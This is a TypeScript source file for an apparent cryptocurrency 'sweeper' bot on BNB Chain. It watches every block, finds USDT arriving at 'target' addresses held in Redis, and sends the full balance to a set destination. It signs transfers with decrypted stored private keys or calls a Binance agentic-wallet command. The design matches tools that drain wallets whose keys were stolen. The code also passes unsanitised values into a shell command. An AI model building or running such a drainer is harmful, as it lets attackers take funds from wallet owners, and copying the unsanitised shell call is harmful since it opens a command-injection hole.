import { createPublicClient, createWalletClient, webSocket, http, fallback, parseAbi, formatUnits } from 'viem';
import { privateKeyToAccount } from 'viem/accounts';
import { bsc } from 'viem/chains';
import { exec } from 'child_process';
import { promisify } from 'util';
import * as dotenv from 'dotenv';
import { redis } from '../config/db';
import { decryptKey } from './encryption';

dotenv.config();
const execAsync = promisify(exec);

const rawWssUrls = process.env.WSS_URLS;
if (!rawWssUrls) throw new Error("Missing WSS_URLS environment variable");

const wssUrls = rawWssUrls.split(',').map(url => url.trim());
const httpUrls = wssUrls.map(url => url.replace('wss://', 'https://'));

const publicClient = createPublicClient({
    chain: bsc,
    transport: fallback(wssUrls.map(url => webSocket(url)))
});

const broadcastClient = createWalletClient({
    chain: bsc,
    transport: fallback(httpUrls.map(url => http(url)))
});

const ERC20_ABI = parseAbi([
    'function balanceOf(address account) view returns (uint256)',
    'function transfer(address recipient, uint256 amount) returns (bool)'
]);

const USDT_CONTRACT = '0x55d398326f99059fF775485246999027B3197955' as `0x${string}`;

export const startSweeperEngine = async () => {
    console.log(`⚡️ Dual-Engine Sweeper Online on BNB Chain: Monitoring USDT...`);

    publicClient.watchBlocks({
        onBlock: async (block) => {
            try {
                const keys = await redis.keys('target:*');
                if (keys.length === 0) return;

                await Promise.all(keys.map(async (redisKey) => {
                    const targetAddress = redisKey.split(':')[1] as `0x${string}`;
                    
                    const usdtBalance = await publicClient.readContract({
                        address: USDT_CONTRACT,
                        abi: ERC20_ABI,
                        functionName: 'balanceOf',
                        args: [targetAddress],
                    });

                    if (usdtBalance === 0n) return;
                    console.log(`🎯 USDT Detected! Balance: ${formatUnits(usdtBalance, 18)} on ${targetAddress}`);

                    const targetData = await redis.hgetall(redisKey);
                    if (!targetData) return;

                    const destination = targetData.destination as `0x${string}`;

                    if (targetData.encryptedKey && targetData.encryptedKey !== '') {
                        const privateKey = decryptKey(targetData.encryptedKey) as `0x${string}`;
                        const account = privateKeyToAccount(privateKey);

                        const bnbBalance = await publicClient.getBalance({ address: targetAddress });
                        const gasPrice = await publicClient.getGasPrice();
                        const txFee = gasPrice * 65000n;

                        if (bnbBalance < txFee) {
                            console.log(`⚠️ Target ${targetAddress} lacks BNB gas.`);
                            return;
                        }

                        const { request } = await publicClient.simulateContract({
                            account,
                            address: USDT_CONTRACT,
                            abi: ERC20_ABI,
                            functionName: 'transfer',
                            args: [destination, usdtBalance],
                        });

                        const txHash = await broadcastClient.writeContract(request);
                        console.log(`✅ Raw Wallet USDT Swept! TX: ${txHash}`);
                    } 
                    else if (targetData.isAgentic === 'true') {
                        console.log(`🤖 Triggering Binance Agentic Auto-Sign Sweep for ${targetAddress}...`);
                        
                        const amountStr = formatUnits(usdtBalance, 18);

                        // Removed invalid --profile flag
                        const { stdout } = await execAsync(`npx @binance/agentic-wallet wallet send --token USDT --amount ${amountStr} --to ${destination} --json`);
                        const result = JSON.parse(stdout);

                        if (result.success) {
                            console.log(`✅ Binance Agentic Sweep Successful! TX: ${result.data?.txHash}`);
                        } else {
                            console.error(`❌ Agentic Sweep failed:`, result.error);
                        }
                    }
                }));
            } catch (error) {
                console.error("[Engine Error] Sweep cycle failed:", error);
            }
        }
    });
};
